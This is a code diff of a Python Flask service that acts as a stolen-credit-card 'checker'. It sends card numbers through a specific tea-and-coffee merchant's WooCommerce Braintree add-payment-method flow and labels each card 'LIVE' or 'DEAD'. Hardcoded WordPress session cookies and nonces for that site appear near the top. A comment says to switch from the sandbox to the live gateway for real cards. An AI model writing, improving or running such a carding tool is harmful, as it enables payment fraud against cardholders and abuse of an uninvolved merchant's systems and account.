@@ -1,9 +1,10 @@
 from flask import Flask, request, jsonify
 import requests
+import urllib.parse
 
 app = Flask(__name__)
 
-# === COOKIES (100% VALID) ===
+# === COOKIES (TERE DIYA HUA) ===
 cookies = {
     'wordpress_sec_ed6aaaf2a4c77ec940184ceefa0c74db': 'xodado2963%7C1763385043%7Cg3GwWn5cnninjA05n4TaDvsWt3e3opoKRxXDG66b0Jo%7C9b96bcb55a9d84ef38f614124a2338a1549f35d7a8c6b6d27aeab7ee4a641cd2',
     'sbjs_migrations': '1418474375998%3D1',
@@ -36,20 +37,18 @@ headers = {
 
 def braintree_check(cc_num, mm, yy, cvv):
     try:
-        # === STEP 1: CLIENT TOKEN ===
+        # Client Token
         resp1 = requests.post(
             'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
-            cookies=cookies,
-            headers=headers,
+            cookies=cookies, headers=headers,
             data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': '9deae5d2bc'},
             timeout=15
         )
-        resp1_data = resp1.json()
-        if not resp1_data.get("success"):
+        if not resp1.json().get("success"):
             return False
-        client_token = resp1_data["data"]
+        client_token = resp1.json()["data"]
 
-        # === STEP 2: NONCE BANA ===
+        # Nonce (SANDBOX — REAL CARDS KE LIYE LIVE MEIN CHANGE KARNA)
         bt_url = "https://api.sandbox.braintreegateway.com/merchants/the-kent-sussex-tea-and-coffee-company/payment_methods/credit_cards"
         resp2 = requests.post(
             bt_url,
@@ -57,44 +56,37 @@ def braintree_check(cc_num, mm, yy, cvv):
             headers={"Authorization": f"Bearer {client_token}", "Content-Type": "application/json"},
             timeout=15
         )
-        
         if resp2.status_code != 201:
             return False
         nonce = resp2.json()["paymentMethod"]["nonce"]
 
-        # === STEP 3: FINAL ADD ===
+        # Final Add
         resp3 = requests.post(
             'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
-            cookies=cookies,
-            headers=headers,
+            cookies=cookies, headers=headers,
             data={'action': 'wc_braintree_add_payment_method', 'payment_method_nonce': nonce, '_wpnonce': '9deae5d2bc'},
             timeout=15
         )
-        
         return resp3.json().get("success", False)
     
-    except Exception as e:
+    except:
         return False
 
 @app.route('/gate=braintreeauth/cc=<path:cc>', methods=['GET'])
 def check_braintree(cc):
     try:
-        # Decode URL-encoded parts like %7C → |
-        import urllib.parse
         cc = urllib.parse.unquote(cc)
-        
         parts = cc.split('|')
         if len(parts) != 4:
-            return jsonify({"success": False, "data": {"error": {"message": "Invalid CC format: Use number|mm|yy|cvc"}}}), 400
+            return jsonify({"success": False, "data": {"error": {"message": "Invalid format"}}}), 400
         
         cc_num, mm, yy, cvv = [p.strip() for p in parts]
-        
         if braintree_check(cc_num, mm, yy, cvv):
             return jsonify({"success": True, "data": {"message": "LIVE - Card added!"}})
         else:
             return jsonify({"success": False, "data": {"error": {"message": "DEAD - Card declined!"}}})
     
-    except Exception as e:
+    except:
         return jsonify({"success": False, "data": {"error": {"message": "Server Error"}}}), 500
 
 if __name__ == '__main__':
